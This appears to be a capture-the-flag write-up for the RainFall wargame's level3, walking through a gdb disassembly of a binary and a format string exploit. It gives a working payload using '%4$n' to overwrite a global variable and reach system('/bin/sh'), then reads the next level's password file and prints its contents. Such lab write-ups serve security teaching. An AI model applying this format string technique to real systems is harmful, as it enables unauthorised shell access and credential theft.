Main calls a function "v"

info function
info variable
display/i $pc

(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:		push   %ebp
   0x080484a5 <+1>:		mov    %esp,%ebp
   0x080484a7 <+3>:		sub    $0x218,%esp
   0x080484ad <+9>:		mov    0x8049860,%eax
   0x080484b2 <+14>:	   mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	   movl   $0x200,0x4(%esp)			   ; store 512 into the 4th offset on the stack (esp) // equivalent to *(%esp + 4)
   0x080484be <+26>:	   lea    -0x208(%ebp),%eax		   ; ebp value - 520 is loaded into eax
   0x080484c4 <+32>:	   mov    %eax,(%esp)   
   0x080484c7 <+35>:	   call   0x80483a0 <fgets@plt>	   ; protected against buffer overflow
   0x080484cc <+40>:	   lea    -0x208(%ebp),%eax		   ; the value at ebp-520 is loaded into eax
   0x080484d2 <+46>:	   mov    %eax,(%esp)				   ; eax is saved in esp, which will be the parameter for printf
   0x080484d5 <+49>:	   call   0x8048390 <printf@plt>	   ; prints what we entered at fgets
   0x080484da <+54>:	   mov    0x804988c,%eax			   ; copies the value located at 0x804988c to eax
   0x080484df <+59>:	   cmp    $0x40,%eax				      ; compares eax to 64
   0x080484e2 <+62>:	   jne    0x8048518 <v+116>		   ; exits if it is not equal to 64
   0x080484e4 <+64>:	   mov    0x8049880,%eax            ; saves m into eax
   0x080484e9 <+69>:	   mov    %eax,%edx
   0x080484eb <+71>:	   mov    $0x8048600,%eax           ; "Wait what?!\n"
   0x080484f0 <+76>:	   mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	   movl   $0xc,0x8(%esp)            ; 12
   0x080484fc <+88>:	   movl   $0x1,0x4(%esp)            ; 1
   0x08048504 <+96>:	   mov    %eax,(%esp)
   0x08048507 <+99>:	   call   0x80483b0 <fwrite@plt>    ; fwrite("Wait what?!\n", 1, 12, stdout);
   0x0804850c <+104>:	movl   $0x804860d,(%esp)         ; "/bin/sh"
   0x08048513 <+111>:	call   0x80483c0 <system@plt>    ; system call on /bin/sh
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.


The variable m, located at 0x804988c has to be = to 64 in order to launch the syscall to /bin/sh

Direct parameter access allows parameters to be accessed directly by using the dollar sign qualifier.
For example, %n$d would access the nth parameter and display it as a decimal number.
This method of direct access eliminates the need to step through memory until the beginning
of the format string is located, since this memory can be accessed directly.

We use %p or %x to know where our m variable starts in the memory.
level3@RainFall:~$ ./level3 
AAAA %p %p %p %p %p %p %p 
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070
-> we need to overwrite the 4th argument (A = 41)

If we replace the 4th %p by a %n, we will be able to write where the 4th %p is pointing at (i.e. at 0x41414141)
But this address doesn't exist, so we get a segfault when we do ./level3 AAAA%p%p%p%n


%4$n: the 4th element of the stack is a %n, equivalent to writing %x%x%x%n, except the 3 %x won't print.
%n writes the number of characters there is before the %n, where it is pointing at.

-> we therefore need to print 64 characters before the %n to store 64 at 0x804988c,
in order to pass the cmp and launch the shell.
The beginning of the format string should consist of the target memory address, 60 bytes of junk,
and then 4th parameter printed as %n (=64, target address (4bytes) + 60 * A).

-------------------------------

level3@RainFall:~$ (python -c 'print ("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")'; cat) | ./level3
ï¿½AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
pwd
/home/user/level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
